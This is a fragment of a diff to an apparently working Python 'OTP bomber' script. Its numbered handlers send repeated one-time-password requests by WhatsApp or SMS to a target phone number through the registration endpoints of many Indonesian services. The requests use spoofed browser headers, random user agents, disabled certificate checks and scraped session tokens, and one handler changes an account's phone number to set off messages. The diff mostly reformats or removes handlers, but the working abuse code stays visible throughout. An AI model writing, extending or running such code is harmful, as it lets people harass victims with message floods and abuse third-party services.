     except Exception as e:
         return None, str(e)
@@ -1981,8 +1438,7 @@ def send_berprestasi_otp(phone_input):
     }
     payload = {"name": name, "email": email, "phone": phone_08, "via": "whatsapp"}
     try:
-        resp = requests.post("https://berprestasi.id/api/otp/send",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://berprestasi.id/api/otp/send", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2005,8 +1461,7 @@ def send_bisatopup_otp(phone_input):
     }
     payload = {"phone_number": phone_08, "type": "register", "channel": "whatsapp"}
     try:
-        resp = requests.post("https://bisatopup.co.id/api/auth/register/send-otp",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://bisatopup.co.id/api/auth/register/send-otp", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2029,32 +1484,7 @@ def send_stockbit_otp(phone_input):
     }
     payload = {"phoneNumber": phone_62, "cancelledRequestId": "", "type": "SMS"}
     try:
-        resp = requests.post("https://exodus.stockbit.com/registration/v4/otp/phone/send",
-                             headers=headers, json=payload, timeout=15, verify=False)
-        return resp.status_code, resp.text
-    except Exception as e:
-        return None, str(e)
-
-# ==================== HANDLER 57: MISTERALADIN ====================
-def send_misteraladin_otp(phone_input):
-    p = normalize(phone_input)
-    phone_62 = p['fmt_62']
-    headers = {
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json",
-        "origin": "https://www.misteraladin.com",
-        "referer": "https://www.misteraladin.com/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
-        "user-agent": get_random_user_agent(),
-    }
-    payload = {"phone": phone_62, "type": "register", "channel": "whatsapp"}
-    try:
-        resp = requests.post("https://m.misteraladin.com/api/members/v2/otp/request",
-                             headers=headers, json=payload, timeout=15, verify=False)
+        resp = requests.post("https://exodus.stockbit.com/registration/v4/otp/phone/send", headers=headers, json=payload, timeout=15, verify=False)
         return resp.status_code, resp.text
     except Exception as e:
         return None, str(e)
@@ -2423,67 +1853,6 @@ def send_halodoc_otp(phone_input):
     except Exception as e:
         return None, str(e)
 
-# ==================== HANDLER 69: PINHOME ====================
-def send_pinhome_otp(phone_input):
-    p = normalize(phone_input)
-    bare = p['bare']
-    headers = {
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "content-type": "application/json",
-        "origin": "https://www.pinhome.id",
-        "referer": "https://www.pinhome.id/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-        "user-agent": get_random_user_agent(),
-    }
-    p2 = normalize(phone_input)
-    payload = {
-        "accountType": "customers", "applicationType": "Pinhome Web",
-        "countryCode": "62", "medium": "whatsapp",
-        "otpType": "register", "phoneNumber": p2['fmt_62'],
-    }
-    try:
-        resp = requests.post(
-            "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
-            headers=headers, json=payload, timeout=15, verify=False)
-        return resp.status_code, resp.text
-    except Exception as e:
-        return None, str(e)
-
-# ==================== HANDLER 70: RUMAH123 ====================
-def send_rumah123_otp(phone_input):
-    p = normalize(phone_input)
-    phone_plus = p['fmt_plus']
-    sess = requests.Session()
-    BASE_URL = "https://www.rumah123.com"
-    try:
-        sess.get(BASE_URL, headers={"User-Agent": get_random_user_agent()}, timeout=10, verify=False)
-        token = sess.cookies.get("_99-acs-token", "")
-    except Exception:
-        token = ""
-    headers = {
-        "accept": "application/json, text/plain, */*",
-        "accept-encoding": "gzip, deflate, br, zstd",
-        "accept-language": "id,en-US;q=0.9,en;q=0.8",
-        "authorization": f"Bearer {token}",
-        "content-type": "application/json",
-        "origin": BASE_URL, "referer": f"{BASE_URL}/",
-        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
-        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
-        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
-        "user-agent": get_random_user_agent(),
-    }
-    payload = {"brand": "rumah123", "destination_address": phone_plus,
-               "type_id": 2, "channel": "WHATSAPP"}
-    try:
-        resp = sess.post(f"{BASE_URL}/api/otp/request-otp",
-                         headers=headers, json=payload, timeout=15, verify=False)
-        return resp.status_code, resp.text
-    except Exception as e:
-        return None, str(e)
 # ==================== HANDLER 71: EASYCASH ====================
 def send_easycash_otp(phone_input):
     import time as _time
@@ -2600,7 +1969,7 @@ _SA_GW     = "https://gw.ruangguru.com"
 _SA_ORIGIN = "https://skillacademy.com"
 _SA_UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
 
-def _sa_hdrs_gw(token="", with_auth="true"):
+def _sa_hdrs_gw(token=""):
     h = {
         "accept":             "application/json",
         "accept-encoding":    "gzip, deflate, br, zstd",
@@ -2618,10 +1987,10 @@ def _sa_hdrs_gw(token="", with_auth="true"):
         "sec-fetch-site":     "cross-site",
         "tenantname":         "skillacademy",
         "user-agent":         _SA_UA,
-        "with-auth":          with_auth,
+        "with-auth":          "true",
     }
     if token:
-        h["authorization"] = f"Bearer {token}" if not token.startswith("eyJ") else token
+        h["authorization"] = token if token.startswith("eyJ") else f"Bearer {token}"
     return h
 
 def _sa_hdrs_sa():
@@ -2648,9 +2017,9 @@ def _sa_hdrs_sa():
     }
 
 def send_skillacademy_otp(phone_input):
-    p = normalize(phone_input)
+    p      = normalize(phone_input)
     target = p['bare']
-    sess = requests.Session()
+    sess   = requests.Session()
 
     # Step 1: login
     token = ""
@@ -2662,17 +2031,17 @@ def send_skillacademy_otp(phone_input):
             timeout=15, verify=False,
         )
         if r.status_code == 200:
-            data = r.json() if r.text else {}
+            data  = r.json() if r.text else {}
             inner = data.get("data", {})
             if isinstance(inner, list): inner = inner[0] if inner else {}
             if isinstance(inner, dict):
-                lr = inner.get("login_response") or {}
+                lr    = inner.get("login_response") or {}
                 token = (lr.get("accessToken") or lr.get("token") or
                          inner.get("accessToken") or inner.get("token") or "")
             if not token:
                 token = r.headers.get("authorization", "").replace("Bearer ", "")
-    except Exception:
-        pass
+    except Exception as e:
+        return None, str(e)
 
     if not token:
         return None, "login failed"
@@ -2682,7 +2051,7 @@ def send_skillacademy_otp(phone_input):
         ("PUT",   f"{_SA_GW}/skillacademy/user"),
         ("PATCH", f"{_SA_GW}/skillacademy/user"),
     ]:
-        for payload in [{"phoneNumber": target}, {"phone": target}, {"phone_number": target}]:
+        for payload in [{"phoneNumber": target}, {"phone": target}]:
             try:
                 fn = sess.put if method == "PUT" else sess.patch
                 fn(url, headers=_sa_hdrs_gw(token=token), json=payload, timeout=10, verify=False)
